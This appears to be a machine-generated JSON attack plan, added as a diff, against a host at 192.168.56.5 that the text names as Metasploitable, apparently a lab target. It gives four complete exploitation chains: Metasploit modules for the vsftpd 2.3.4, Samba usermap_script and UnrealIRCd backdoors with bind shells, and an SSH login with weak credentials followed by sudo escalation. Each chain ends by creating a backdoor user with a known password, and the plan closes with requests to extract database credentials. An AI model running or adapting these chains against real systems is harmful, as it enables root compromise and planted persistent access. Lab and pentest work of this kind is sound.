@@ -1,0 +1,406 @@
+{
+    "target": "192.168.56.5",
+    "summary": [
+        "vsftpd 2.3.4 backdoor (CVE-2011-2523) for root shell access",
+        "Samba usermap_script (CVE-2007-2447) leading to root privileges",
+        "UnrealIRCd backdoor (CVE-2010-2075) for direct root access",
+        "Weak SSH credentials (msfadmin:msfadmin) for user-level access and potential escalation"
+    ],
+    "attack_chains": [
+        {
+            "name": "Chain 1: vsftpd Backdoor to Root Persistence",
+            "use_persistent_session": true,
+            "session_name": "vsftpd_session",
+            "stages": [
+                {
+                    "stage": "initial_access",
+                    "description": "Exploit vsftpd 2.3.4 backdoor on port 21 to gain root shell using bind payload",
+                    "commands": [
+                        {
+                            "type": "start_session",
+                            "session_name": "vsftpd_session",
+                            "command": "msfconsole -q"
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "use exploit/unix/ftp/vsftpd_234_backdoor",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "set RHOSTS 192.168.56.5",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "set RPORT 21",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "set PAYLOAD cmd/unix/bind_perl",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "set LPORT 4444",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "exploit -j",
+                            "wait": 15
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "sessions -l",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for 'Command shell session X opened' in output"
+                },
+                {
+                    "stage": "privilege_escalation",
+                    "description": "Verify root privileges from backdoor shell",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "sessions -i 1 -c 'id'",
+                            "wait": 3
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "sessions -i 1 -c 'whoami'",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for uid=0(root) in output"
+                },
+                {
+                    "stage": "persistence",
+                    "description": "Create backdoor user for SSH access and verify",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "sessions -i 1 -c 'useradd -m -s /bin/bash backdoor1'",
+                            "wait": 3
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "sessions -i 1 -c \"echo 'backdoor1:password123' | chpasswd\"",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "vsftpd_session",
+                            "command": "sessions -i 1 -c 'cat /etc/passwd | grep backdoor1'",
+                            "wait": 2
+                        },
+                        {
+                            "type": "close_session",
+                            "session_name": "vsftpd_session"
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa backdoor1@192.168.56.5 'whoami'"
+                        }
+                    ],
+                    "verification": "SSH login succeeds and returns 'backdoor1'"
+                }
+            ]
+        },
+        {
+            "name": "Chain 2: Samba Usermap Script to Root Persistence",
+            "use_persistent_session": true,
+            "session_name": "samba_session",
+            "stages": [
+                {
+                    "stage": "initial_access",
+                    "description": "Exploit Samba usermap_script (CVE-2007-2447) on port 445 to gain root shell using bind payload",
+                    "commands": [
+                        {
+                            "type": "start_session",
+                            "session_name": "samba_session",
+                            "command": "msfconsole -q"
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "use exploit/multi/samba/usermap_script",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "set RHOSTS 192.168.56.5",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "set RPORT 445",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "set PAYLOAD cmd/unix/bind_perl",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "set LPORT 4445",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "exploit -j",
+                            "wait": 15
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -l",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for 'Command shell session X opened' in output"
+                },
+                {
+                    "stage": "privilege_escalation",
+                    "description": "Verify root privileges from Samba exploit shell",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -i 1 -c 'id'",
+                            "wait": 3
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -i 1 -c 'whoami'",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for uid=0(root) in output"
+                },
+                {
+                    "stage": "persistence",
+                    "description": "Create backdoor user for SSH access and verify",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -i 1 -c 'useradd -m -s /bin/bash backdoor2'",
+                            "wait": 3
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -i 1 -c \"echo 'backdoor2:password123' | chpasswd\"",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -i 1 -c 'cat /etc/passwd | grep backdoor2'",
+                            "wait": 2
+                        },
+                        {
+                            "type": "close_session",
+                            "session_name": "samba_session"
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa backdoor2@192.168.56.5 'whoami'"
+                        }
+                    ],
+                    "verification": "SSH login succeeds and returns 'backdoor2'"
+                }
+            ]
+        },
+        {
+            "name": "Chain 3: UnrealIRCd Backdoor to Root Persistence",
+            "use_persistent_session": true,
+            "session_name": "irc_session",
+            "stages": [
+                {
+                    "stage": "initial_access",
+                    "description": "Exploit UnrealIRCd backdoor (CVE-2010-2075) on port 6667 to gain root shell using bind payload",
+                    "commands": [
+                        {
+                            "type": "start_session",
+                            "session_name": "irc_session",
+                            "command": "msfconsole -q"
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "use exploit/unix/irc/unreal_ircd_3281_backdoor",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "set RHOSTS 192.168.56.5",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "set RPORT 6667",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "set PAYLOAD cmd/unix/bind_perl",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "set LPORT 4446",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "exploit -j",
+                            "wait": 15
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "sessions -l",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for 'Command shell session X opened' in output"
+                },
+                {
+                    "stage": "privilege_escalation",
+                    "description": "Verify root privileges from IRC backdoor shell",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "sessions -i 1 -c 'id'",
+                            "wait": 3
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "sessions -i 1 -c 'whoami'",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for uid=0(root) in output"
+                },
+                {
+                    "stage": "persistence",
+                    "description": "Create backdoor user for SSH access and verify",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "sessions -i 1 -c 'useradd -m -s /bin/bash backdoor3'",
+                            "wait": 3
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "sessions -i 1 -c \"echo 'backdoor3:password123' | chpasswd\"",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "irc_session",
+                            "command": "sessions -i 1 -c 'cat /etc/passwd | grep backdoor3'",
+                            "wait": 2
+                        },
+                        {
+                            "type": "close_session",
+                            "session_name": "irc_session"
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa backdoor3@192.168.56.5 'whoami'"
+                        }
+                    ],
+                    "verification": "SSH login succeeds and returns 'backdoor3'"
+                }
+            ]
+        },
+        {
+            "name": "Chain 4: Direct SSH Login (Non-Metasploit) to User Access and Persistence",
+            "use_persistent_session": false,
+            "session_name": "",
+            "stages": [
+                {
+                    "stage": "initial_access",
+                    "description": "Login to SSH with weak credentials (msfadmin:msfadmin) for user shell",
+                    "commands": [
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'msfadmin' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.56.5 'whoami'"
+                        }
+                    ],
+                    "verification": "Login succeeds and returns 'msfadmin'"
+                },
+                {
+                    "stage": "privilege_escalation",
+                    "description": "Escalate to root using known Metasploitable vulnerabilities (e.g., kernel exploit or sudo misconfig)",
+                    "commands": [
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'msfadmin' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.56.5 \"echo 'msfadmin' | sudo -S find / -perm -4000 -user root 2>/dev/null\""
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'msfadmin' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.56.5 \"echo 'msfadmin' | sudo -S /bin/bash -c 'id'\""
+                        }
+                    ],
+                    "verification": "Check for root SUID binaries or successful sudo access to uid=0"
+                },
+                {
+                    "stage": "persistence",
+                    "description": "Create backdoor user from escalated shell and verify SSH access",
+                    "commands": [
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'msfadmin' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.56.5 \"echo 'msfadmin' | sudo -S useradd -m -s /bin/bash backdoor4\""
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'msfadmin' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.56.5 \"echo 'msfadmin' | sudo -S echo 'backdoor4:password123' | chpasswd\""
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa backdoor4@192.168.56.5 'whoami'"
+                        }
+                    ],
+                    "verification": "SSH login succeeds and returns 'backdoor4'"
+                }
+            ]
+        }
+    ],
+    "followup_requests": [
+        "Run detailed enumeration on PostgreSQL and MySQL for credential extraction",
+        "Perform web vulnerability scans on ports 80 and 8180 for additional RCE vectors"
+    ]
+}
